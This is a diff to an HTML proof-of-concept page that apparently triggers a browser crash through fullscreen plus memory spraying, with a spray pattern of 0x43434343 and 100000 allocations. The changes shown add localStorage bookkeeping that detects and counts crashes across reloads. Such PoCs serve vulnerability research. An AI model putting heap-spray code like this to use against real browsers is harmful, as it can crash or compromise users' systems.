@@ -153,28 +153,40 @@ body {
 </div>
 <script>
 window.onload = () => {
-  const lastTime = parseInt(localStorage.getItem("crashTime") || "0");
+  const wasCrashing = localStorage.getItem("crashFlag") === "1";
+  const time = parseInt(localStorage.getItem("crashTime") || "0");
   const now = Date.now();
-  const elapsed = Math.floor((now - lastTime) / 1000);
+  const elapsed = Math.floor((now - time) / 1000);
 
-  if (lastTime && elapsed > 4) {
-    let counter = parseInt(localStorage.getItem("crashCount") || "0");
-    counter += 1;
-    localStorage.setItem("crashCount", counter.toString());
+  if (wasCrashing && elapsed > 5) {
+    let count = parseInt(localStorage.getItem("crashCount") || "0");
+    count++;
+    localStorage.setItem("crashCount", count.toString());
+
+    alert(`⚠️ Last run may have triggered instability or crash.\n⏱ Elapsed: ${elapsed}s\n💥 Total crashes detected: ${count}`);
+
+    // limpia solo ahora tras alert
+    localStorage.removeItem("crashFlag");
     localStorage.removeItem("crashTime");
-
-    alert(`⚠️ Last run may have triggered instability or crash.\n⏱ Elapsed: ${elapsed}s\n💥 Total crashes detected: ${counter}`);
   }
 };
+
+// si se cerró bien, quitamos la marca
+window.addEventListener("beforeunload", () => {
+  localStorage.removeItem("crashFlag");
+  localStorage.removeItem("crashTime");
+});
 
 function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
+  // se marca crash inminente
+  localStorage.setItem("crashFlag", "1");
   localStorage.setItem("crashTime", Date.now().toString());
 
   document.body.requestFullscreen().then(() => {
-    const PATTERN   = 0x43434343;
+    const PATTERN = 0x43434343;
     const SPRAY_CNT = 100000;
     const SPRAY_LEN = 16;
 
@@ -201,6 +213,7 @@ function runPoC() {
   });
 }
 </script>
+
 
 
 
